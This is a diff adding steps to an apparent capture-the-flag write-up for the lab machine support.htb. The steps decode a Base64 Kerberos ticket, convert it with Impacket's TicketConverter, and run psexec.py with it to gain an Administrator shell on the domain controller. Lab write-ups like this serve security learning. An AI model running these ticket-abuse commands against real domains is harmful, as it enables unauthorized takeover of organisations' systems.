@@ -418,3 +418,13 @@ $Descriptor.DiscretionaryAcl
 ```
 - now grab the last Base64 encoded ticket and use it on our local machine to get a shell on the DC as Administrator
 - copy the value of the last ticket and paste it inside a file called ticket.kirbi.b64
+- Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket
+```
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+```
+-  convert this ticket to a format that Impacket can use. This can be achieved with Impackets' TicketConverter.py
+-  To acquire a shell we can use Impackets' psexec.py 
+```
+KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+```
+
